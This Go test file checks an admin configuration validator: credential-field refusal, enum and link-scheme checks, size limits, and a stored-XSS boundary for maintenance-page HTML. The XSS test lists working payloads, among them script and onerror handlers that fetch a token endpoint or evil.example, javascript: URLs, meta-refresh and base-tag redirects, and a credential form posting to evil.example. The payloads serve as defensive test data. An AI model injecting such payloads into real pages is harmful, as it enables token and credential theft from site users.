package admin

// Validator-level tests for the admin Configuration write (unit A14, #200).
//
// These need no database. They exist because two of the validator's rules
// cannot be reached through any AVAILABLE section today — no section this
// platform serves declares a `format: password` field or an `enum` — and a rule
// that is only asserted through a section that happens to be writable would stop
// being asserted the moment that section changed.

import (
	"strings"
	"testing"
)

func fieldSpec(spec map[string]any) configSection {
	return configSection{id: "test", fields: []map[string]any{spec}}
}

// TestRejectsCredentialFields is the vault boundary. `format: password` marks a
// real secret — an OIDC client secret, a LiteLLM master key, a Postgres URL with
// a password in it. Those belong in `centry.secrets_*`, not in a JSONB column
// every holder of `runtime.plugins` can read. The rule is on the FIELD SPEC
// rather than on a list of section ids, so a section that becomes writable later
// cannot quietly acquire a plaintext-secret column.
func TestRejectsCredentialFields(t *testing.T) {
	section := fieldSpec(map[string]any{
		"key":    "oidc_client_secret",
		"type":   "string",
		"format": "password",
	})
	reason := validateSectionValues(section, map[string]any{"oidc_client_secret": "hunter2"})
	if reason == "" {
		t.Fatal("a credential field was accepted into the platform-configuration table")
	}
	if !strings.Contains(reason, "oidc_client_secret") {
		t.Errorf("the refusal does not name the field: %q", reason)
	}
	if !strings.Contains(reason, "vault") {
		t.Errorf("the refusal does not say where the value belongs: %q", reason)
	}
}

// TestCredentialRefusalBeatsTypeAgreement — the credential check must run before
// the type check, or a well-typed secret would be accepted.
func TestCredentialRefusalBeatsTypeAgreement(t *testing.T) {
	section := fieldSpec(map[string]any{
		"key": "gateway_master_key", "type": "string", "format": "password",
	})
	if validateSectionValues(section, map[string]any{"gateway_master_key": "sk-live-1"}) == "" {
		t.Fatal("a correctly typed credential was accepted")
	}
}

// TestEnumIsEnforced — the schema declares closed sets (`auth_provider` is
// form|oidc, a budget period is daily|weekly|monthly|yearly). Storing anything
// else produces a value every consumer must defend against separately.
func TestEnumIsEnforced(t *testing.T) {
	section := fieldSpec(map[string]any{
		"key": "banner_icon", "type": "string", "enum": []string{"info", "warning"},
	})
	if reason := validateSectionValues(section, map[string]any{"banner_icon": "warning"}); reason != "" {
		t.Fatalf("a declared enum member was refused: %q", reason)
	}
	reason := validateSectionValues(section, map[string]any{"banner_icon": "danger"})
	if reason == "" {
		t.Fatal("a value outside the declared enum was accepted")
	}
	if !strings.Contains(reason, "info") || !strings.Contains(reason, "warning") {
		t.Errorf("the refusal does not list the allowed values: %q", reason)
	}
}

// TestLinkSchemeRefusalNamesTheScheme — an operator who pasted a `mailto:` needs
// to be told which part was wrong, not "failed to save".
func TestLinkSchemeRefusalNamesTheScheme(t *testing.T) {
	section := fieldSpec(map[string]any{"key": "resources_x_links", "type": "array"})
	reason := validateSectionValues(section, map[string]any{
		"resources_x_links": []any{map[string]any{"title": "t", "url": "mailto:ops@example.com"}},
	})
	if reason == "" {
		t.Fatal("a mailto link was accepted")
	}
	if !strings.Contains(reason, "mailto") {
		t.Errorf("the refusal does not name the scheme: %q", reason)
	}
}

// TestLinkValidationRunsOnEveryEntry — a hostile entry after a valid one must
// still be caught. Validating only the first entry is the classic version of
// this bug.
func TestLinkValidationRunsOnEveryEntry(t *testing.T) {
	section := fieldSpec(map[string]any{"key": "resources_x_links", "type": "array"})
	reason := validateSectionValues(section, map[string]any{
		"resources_x_links": []any{
			map[string]any{"title": "ok", "url": "https://example.com"},
			map[string]any{"title": "bad", "url": "javascript:alert(1)"},
		},
	})
	if reason == "" {
		t.Fatal("a hostile link in a later position was accepted")
	}
	if !strings.Contains(reason, "[1]") {
		t.Errorf("the refusal does not say which entry: %q", reason)
	}
}

// TestLinkURLsAreTrimmedBeforeTheSchemeCheck — " javascript:alert(1)" parses as
// a relative path with a leading space unless it is trimmed first, which would
// let the scheme check through and store an href the browser still executes.
func TestLinkURLsAreTrimmedBeforeTheSchemeCheck(t *testing.T) {
	section := fieldSpec(map[string]any{"key": "resources_x_links", "type": "array"})
	if validateSectionValues(section, map[string]any{
		"resources_x_links": []any{map[string]any{"title": "t", "url": "  javascript:alert(1)"}},
	}) == "" {
		t.Fatal("a leading space smuggled a javascript: URL past the scheme check")
	}
}

// TestOversizedValuesAreRefused — this row is served to every user through the
// public Help Center read, so one paste must not become a multi-megabyte
// response.
func TestOversizedValuesAreRefused(t *testing.T) {
	section := fieldSpec(map[string]any{"key": "resources_x_title", "type": "string"})
	if validateSectionValues(section, map[string]any{
		"resources_x_title": strings.Repeat("a", maxConfigValueBytes+1),
	}) == "" {
		t.Fatal("an oversized string was accepted")
	}
	section = fieldSpec(map[string]any{"key": "resources_x_links", "type": "array"})
	entries := make([]any, 0, 65)
	for i := 0; i < 65; i++ {
		entries = append(entries, map[string]any{"title": "t", "url": "https://example.com"})
	}
	if validateSectionValues(section, map[string]any{"resources_x_links": entries}) == "" {
		t.Fatal("an unbounded link list was accepted")
	}
}

// TestUnknownKeysAreRefusedDeterministically — the keys are sorted before
// validation, so a body with two problems always names the same one. Without it
// the operator sees a different error on each retry of an unchanged request.
func TestUnknownKeysAreRefusedDeterministically(t *testing.T) {
	section := fieldSpec(map[string]any{"key": "resources_x_title", "type": "string"})
	body := map[string]any{"zzz_unknown": 1, "aaa_unknown": 1}
	first := validateSectionValues(section, body)
	for i := 0; i < 20; i++ {
		if got := validateSectionValues(section, body); got != first {
			t.Fatalf("refusal is not deterministic: %q then %q", first, got)
		}
	}
	if !strings.Contains(first, "aaa_unknown") {
		t.Errorf("expected the lexicographically first offender, got %q", first)
	}
}

// TestMergeKeepsDeclaredKeysAndDropsOrphans pins the overlay direction at the
// unit level, where a table is not needed to state it.
func TestMergeKeepsDeclaredKeysAndDropsOrphans(t *testing.T) {
	section := configSection{id: "test", fields: []map[string]any{
		{"key": "declared", "default": "fallback"},
		{"key": "no_default"},
	}}
	values := mergeSectionValues(section, map[string]any{
		"declared": "stored",
		"orphan":   "should not appear",
	})
	if values["declared"] != "stored" {
		t.Errorf("stored value did not win: %v", values["declared"])
	}
	if got, ok := values["no_default"]; !ok || got != nil {
		t.Errorf("a field with no default must still be present, as null: %v", got)
	}
	if _, present := values["orphan"]; present {
		t.Error("an orphaned stored key reached the form")
	}
}

// TestEverySectionIsEitherAvailableOrExplained — the page renders what the
// server declares. A section with no fields AND no reason is a blank pane with
// no explanation, which is the exact failure this unit removes.
func TestEverySectionIsEitherAvailableOrExplained(t *testing.T) {
	for _, section := range configSections() {
		id, _ := section["id"].(string)
		reason, _ := section["unavailable_reason"].(string)
		fields, _ := section["fields"].([]map[string]any)
		if reason == "" && len(fields) == 0 {
			t.Errorf("section %q is offered as editable but has no fields", id)
		}
	}
}

// ── The splash HTML body (maintenance_html) ──────────────────────────────────
//
// pylon stored `splash_template` as raw bytes and served them verbatim with no
// sanitisation at all (legacy/plugins/bootstrap/tools/splash.py:164-178). The
// port keeps the capability and refuses the executable half of it here, at the
// moment an operator can still fix what they pasted.
//
// The check is deliberately paired with a client sanitiser rather than trusted
// alone: this one keeps script out of a row that outlives every renderer, and
// the renderer keeps script off screen for a row written before this check
// existed. Each test below names which half it is asserting.

func splashField() configSection {
	return fieldSpec(map[string]any{
		"key":    "maintenance_html",
		"type":   "string",
		"format": "html",
	})
}

// TestSplashHTMLRoundTripsOrdinaryMarkup — the capability, not just the
// refusal. A rule that refused everything would also pass every test below.
func TestSplashHTMLRoundTripsOrdinaryMarkup(t *testing.T) {
	body := `<p>We are upgrading the database.</p>` +
		`<p>Status: <a href="https://status.example.com" target="_blank">status page</a></p>` +
		`<ul><li>Starts 02:00 UTC</li><li>Ends 04:00 UTC</li></ul>`
	if reason := validateSectionValues(splashField(), map[string]any{"maintenance_html": body}); reason != "" {
		t.Fatalf("an ordinary splash body was refused: %s", reason)
	}
}

// TestSplashHTMLAcceptsAnEmptyBody — empty means "use the product's own
// splash", so it must not be a validation error.
func TestSplashHTMLAcceptsAnEmptyBody(t *testing.T) {
	if reason := validateSectionValues(splashField(), map[string]any{"maintenance_html": ""}); reason != "" {
		t.Fatalf("an empty splash body was refused: %s", reason)
	}
}

// TestSplashHTMLRefusesExecutableMarkup is the stored-XSS boundary. Each case
// is a distinct way to run code in the browser of every user the maintenance
// window refuses; none of them needs a `<script>` tag.
func TestSplashHTMLRefusesExecutableMarkup(t *testing.T) {
	cases := map[string]string{
		"script tag":        `<p>hi</p><script>fetch('/api/v2/auth/token')</script>`,
		"closing script":    `</SCRIPT ><p>hi</p>`,
		"image handler":     `<img src=x onerror="fetch('//evil.example')">`,
		"javascript url":    `<a href="javascript:alert(1)">click</a>`,
		"iframe":            `<iframe src="https://evil.example"></iframe>`,
		"style block":       `<style>body{display:none}</style>`,
		"meta refresh":      `<meta http-equiv="refresh" content="0;url=https://evil.example">`,
		"base tag":          `<base href="https://evil.example/">`,
		"credential form":   `<form action="https://evil.example"><input name="password"></form>`,
		"svg vector":        `<svg onload="alert(1)"></svg>`,
		"mixed case script": `<ScRiPt>alert(1)</ScRiPt>`,
	}
	for name, body := range cases {
		t.Run(name, func(t *testing.T) {
			reason := validateSectionValues(splashField(), map[string]any{"maintenance_html": body})
			if reason == "" {
				t.Fatalf("executable splash markup was accepted: %s", body)
			}
			if !strings.Contains(reason, "maintenance_html") {
				t.Errorf("the refusal does not name the field: %q", reason)
			}
		})
	}
}

// TestSplashHTMLRefusalIsScopedToHTMLFields — the same markup in the MARKDOWN
// message field is not refused here, because that field is rendered with raw
// HTML disabled and would otherwise be unable to carry the words "<script>".
func TestSplashHTMLRefusalIsScopedToHTMLFields(t *testing.T) {
	section := fieldSpec(map[string]any{
		"key": "maintenance_message", "type": "string", "format": "textarea",
	})
	if reason := validateSectionValues(section, map[string]any{
		"maintenance_message": "Do not paste <script> tags into the HTML field.",
	}); reason != "" {
		t.Fatalf("a markdown message mentioning a script tag was refused: %s", reason)
	}
}

// TestSplashHTMLIsBoundedBy64KiB — the row is served to every refused user on
// every request, so an unbounded paste is a cost paid forever.
func TestSplashHTMLIsBoundedBy64KiB(t *testing.T) {
	atLimit := strings.Repeat("a", maxConfigValueBytes)
	if reason := validateSectionValues(splashField(), map[string]any{"maintenance_html": atLimit}); reason != "" {
		t.Fatalf("a body exactly at the 64 KiB limit was refused: %s", reason)
	}
	overLimit := strings.Repeat("a", maxConfigValueBytes+1)
	reason := validateSectionValues(splashField(), map[string]any{"maintenance_html": overLimit})
	if reason == "" {
		t.Fatal("a splash body over 64 KiB was accepted")
	}
	if !strings.Contains(reason, "too long") {
		t.Errorf("the refusal does not say the value is too long: %q", reason)
	}
}
